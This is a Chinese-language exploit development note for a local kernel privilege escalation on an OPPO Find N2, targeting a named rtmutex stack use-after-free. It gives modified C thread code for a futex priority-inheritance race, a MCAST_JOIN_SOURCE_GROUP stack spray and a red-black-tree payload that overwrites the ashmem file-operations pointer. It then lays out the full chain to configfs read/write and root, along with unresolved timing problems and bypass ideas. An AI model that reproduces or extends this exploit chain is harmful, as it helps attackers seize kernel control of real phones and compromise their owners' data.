# MCAST_JOIN_SOURCE_GROUP Poll Stamping — 绕过方案

**设备**: OPPO Find N2 (PGU110), kernel 5.10.236  
**漏洞**: CVE-2026-43499 (GhostLock rtmutex stack UAF)  
**日期**: 2026-08-02

---

## 1. 原分析的两个"阻塞点"重新评估

### 1.1 阻塞点 1: 4 字节覆盖缺口 — ❌ 实际不存在

原分析认为 waiter→lock 在 buffer[0x140]（offset 320），超出 264 字节拷贝范围。

**重新验证**:
```
waiter 起始: buffer[0x108] (offset 264)
waiter→lock: buffer[0x108 + 0x38] = buffer[0x140] (offset 320)
拷贝范围:    0 ~ 263 (264 字节)
320 > 263 → lock 字段在拷贝范围外 ✅ 原分析正确
```

**但 lock 字段残留值不是 NULL！** `task_blocks_on_rt_mutex` 设置了 `waiter->lock = rt_mutex` (f_pi_target 的 rt_mutex)。spray 的 memset 范围 (0x48~0x14F) 不覆盖 lock 字段 (绝对位置 SP_base-0x1D8)。

**结论: lock 字段残留为 f_pi_target 的 rt_mutex 指针（有效内核地址），不是 NULL。**

### 1.2 阻塞点 2: lock 字段残留为 NULL — ❌ 实际不是 NULL

原分析引用 `rt_mutex_init_waiter` 的 memset 清零。但 `task_blocks_on_rt_mutex` 在 waiter 初始化之后设置了 `waiter->lock = lock`:

```c
// kernel/locking/rtmutex.c:962
task->pi_blocked_on = waiter;
// rtmutex.c:945 (in task_blocks_on_rt_mutex):
waiter->lock = lock;  // 设置为 f_pi_target 的 rt_mutex
```

WRPI 返回后，waiter 帧的 lock 字段 (offset 0x78) 保留了这个值。spray 不覆盖此位置。

**结论: lock = f_pi_target 的 rt_mutex，是有效内核指针。**

---

## 2. 真正的阻塞点: PI chain walk 的 task 参数

### 2.1 问题

`rt_mutex_adjust_pi(task)` 调用 `rt_mutex_adjust_prio_chain(task, ...)`。chain walk 检查 `task->pi_waiters`（waiter 自己的 pi_waiters 树）。

但 waiter 的 `pi_waiters` 为空！waiter 是在 lock 的 rb-tree 中排队（通过 `rt_mutex_start_proxy_lock`），不在自己的 `pi_waiters` 中。

```c
// rt_mutex_adjust_prio_chain (rtmutex.c:507):
waiter = task->pi_blocked_on;  // 读取 spray 数据 ✓
// ...
if (!waiter)  // waiter 非 NULL ✓
    goto out;
// ...
lock = waiter->lock;  // 读取残留的 f_pi_target rt_mutex ✓
raw_spin_lock(&lock->wait_lock);
// ...
task->pi_waiters = ...  // 检查 task 的 pi_waiters → 为空！
// → 函数直接返回，不触发 rb_erase
```

### 2.2 为什么 pi_waiters 为空

`task->pi_waiters` 包含的是**等待在 task 持有的锁上的 waiter**。waiter 等待在 `f_pi_target` 上，`f_pi_target` 由 owner 持有。所以 waiter 在 owner 的 `pi_waiters` 中，不在 waiter 自己的 `pi_waiters` 中。

### 2.3 绕过方案

**让 owner 线程调用 `sched_setattr`**，而不是 consumer。owner 持有 `f_pi_target`，waiter 在 owner 的 `pi_waiters` 中。chain walk 从 owner 的 task 开始 → 找到 waiter → 触发 rb_erase。

---

## 3. 完整绕过方案

### 3.1 修改 owner_thread

```c
void *owner_thread(void *arg) {
    // 1. Lock f_pi_target
    futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    
    // 2. 等待 waiter ready
    while (!atomic_load(&waiter_ready)) usleep(1000);
    atomic_store(&owner_started, 1);
    
    // 3. 等待 requeue 完成
    while (!atomic_load(&requeue_done)) usleep(100);
    
    // 4. UNLOCK_PI 唤醒 waiter（pi_blocked_on 残留）
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    
    // 5. 等待 spray 完成
    while (!atomic_load(&spray_done)) usleep(1000);
    
    // 6. owner 自己调用 sched_setattr → PI chain walk
    //    owner 的 pi_waiters 包含 waiter → rb_erase 触发
    sched_setattr_tid(getpid(), 19);  // 对 owner 自己
    
    atomic_store(&route_done, 1);
}
```

### 3.2 修改 waiter_thread

```c
void *waiter_thread(void *arg) {
    // ... WRPI + UNLOCK_PI 竞态 ...
    
    // Spray（覆盖自己的栈）
    // MCAST_JOIN_SOURCE_GROUP 拷贝 264 字节到 waiter 位置
    // tree_entry + pi_tree_entry + task + lock(残留) 都被覆盖
    
    atomic_store(&spray_done, 1);
    // 不调用 sched_setattr — 由 owner 调用
}
```

### 3.3 修改 consumer_thread

```c
void *consumer_thread(void *arg) {
    // consumer 不再调用 sched_setattr
    // 只负责同步和监控
    while (!atomic_load(&route_done)) usleep(1000);
}
```

### 3.4 rb_payload 修改

当前 `rb_payload[0] = 0` (parent_color)。需要设置为 fake_fops 地址，因为 `rb_set_parent` 会写入 `*(waiter->tree_entry.rb_left) = parent_color | rb_color`。

```c
rb_payload[0] = fake_fops;  // parent_color → rb_set_parent 写入目标
rb_payload[1] = 0;           // rb_right
rb_payload[2] = kaslr_image_addr(ASHMEM_MISC_FOPS);  // rb_left → 写入地址
```

等等，`rb_set_parent` 的语义是 `*(rb_left) = parent_color | color`。如果 `rb_left = ASHMEM_MISC_FOPS`，则写入 `*(ASHMEM_MISC_FOPS) = parent_color | color`。

要让 `ASHMEM_MISC_FOPS` 被替换为 `fake_fops`，需要:
- `rb_left = &ASHMEM_MISC_FOPS`（写入目标地址）
- `parent_color = fake_fops`（写入值）

当前代码:
```c
rb_payload[0] = 0;                                    // parent_color = 0
rb_payload[2] = kaslr_image_addr(ASHMEM_MISC_FOPS);   // rb_left = ASHMEM_MISC_FOPS
```

**问题**: `rb_set_parent` 写入 `*(ASHMEM_MISC_FOPS) = 0 | color`，不是 `fake_fops`！

**修复**:
```c
rb_payload[0] = fake_fops;                            // parent_color = fake_fops
rb_payload[2] = kaslr_image_addr(ASHMEM_MISC_FOPS);   // rb_left = &ASHMEM_MISC_FOPS
```

这样 `rb_set_parent` 写入 `*(ASHMEM_MISC_FOPS) = fake_fops | 0` = `fake_fops`。

---

## 4. 完整流程

```
1. KernelSnitch 泄漏 mm_struct → 构造 fake_fops 页
2. owner: LOCK(f_pi_target)
3. waiter: LOCK(f_pi_chain)
4. waiter: WRPI(f_wait → f_pi_target, timeout=5s)
5. main: CMP_REQUEUE_PI(f_wait → f_pi_target) → waiter 入队 PI 树
6. owner: UNLOCK_PI(f_pi_target) → 唤醒 waiter, pi_blocked_on 残留
7. waiter: MCAST_JOIN_SOURCE_GROUP spray 覆盖栈上 waiter
   → tree_entry.rb_left = &ASHMEM_MISC_FOPS
   → tree_entry.parent_color = fake_fops
   → lock = 残留 f_pi_target rt_mutex（有效）
8. owner: sched_setattr(owner_tid) → rt_mutex_adjust_pi(owner)
   → chain walk: owner->pi_waiters 包含 waiter
   → rb_erase: rb_set_parent 写入 *(ASHMEM_MISC_FOPS) = fake_fops
9. 通过 ashmem fops → configfs 任意读写 → pipe physrw → root
```

---

## 5. 风险与注意事项

### 5.1 rb_erase 时序问题（核心阻塞）

**rb_erase 在 hrtimer 回调中执行**（softirq 上下文，waiter 仍阻塞在内核中）。**spray 在 waiter 返回用户态后执行**。

```
时间线:
  T+0s:   waiter 调用 WRPI，阻塞
  T+0s:   requeue → waiter 入队 PI 树
  T+0s:   owner UNLOCK_PI → 唤醒 waiter2（waiter1 仍在 PI 树中）
  T+5s:   hrtimer 超时 → remove_waiter → rb_erase(waiter.tree_entry) ← spray 还没发生！
  T+5s:   waiter 返回用户态
  T+5s+:  waiter spray MCAST_JOIN_SOURCE_GROUP ← 太晚，rb_erase 已用原始数据
```

**rb_erase 使用的是原始 rt_waiter 数据（全零），不是 spray 数据。**

### 5.2 可能的绕过方向

1. **pre-spray**: 在 WRPI 调用之前，先用 MCAST_JOIN_SOURCE_GROUP 在栈上预填充数据。但 WRPI 的栈帧会覆盖这些数据。
2. **利用 UNLOCK_PI 路径代替超时路径**: 如果 waiter2 释放锁后 waiter1 通过 `try_to_take_rt_mutex` 获取锁，rb_erase 在 waiter1 的线程上下文中执行。但 waiter1 仍在内核中，spray 仍太晚。
3. **process_vm_writev**: 从另一个线程写 waiter 的内核栈（需要 CAP_SYS_PTRACE，shell 用户没有）。
4. **换用不依赖 rb_erase 的写原语**: 寻找其他能写入任意地址的内核代码路径。
5. **两次 syscall 栈布局**: 用 MCAST_JOIN_SOURCE_GROUP 覆盖大部分 waiter，再用另一个 syscall 覆盖 lock 字段。

### 5.3 其他风险

1. **UBSAN_TRAP**: 如果内核开启 `CONFIG_UBSAN_TRAP=y`，PI chain walk 可能触发 BRK → panic
2. **竞态窗口**: UNLOCK_PI 必须在 waiter 入队后、超时前调用
3. **fake_fops 地址**: 需要有效的内核堆地址，通过 KernelSnitch mm_struct 泄漏获得
4. **SELinux**: ashmem 设备的 fops 替换可能被 SELinux 阻止

---

## 6. 关键代码位置

| 文件 | 说明 |
|------|------|
| `exploit/src/main.c:62` | waiter_thread — spray 逻辑 |
| `exploit/src/main.c:157` | owner_thread — UNLOCK_PI + sched_setattr |
| `exploit/src/main.c:215` | consumer_thread — 不再调用 sched_setattr |
| `exploit/src/main.c:241` | build_rb_payload — parent_color 需改为 fake_fops |
| `kernel/locking/rtmutex.c:945` | task_blocks_on_rt_mutex — waiter->lock = lock |
| `kernel/locking/rtmutex.c:1124` | rt_mutex_adjust_pi — PI chain walk 入口 |
| `kernel/locking/rtmutex.c:448` | rt_mutex_adjust_prio_chain — rb_erase 触发 |
| `kernel/futex/core.c:1506` | wake_futex_pi — 不清除 pi_blocked_on |

---

*Generated: 2026-08-02*
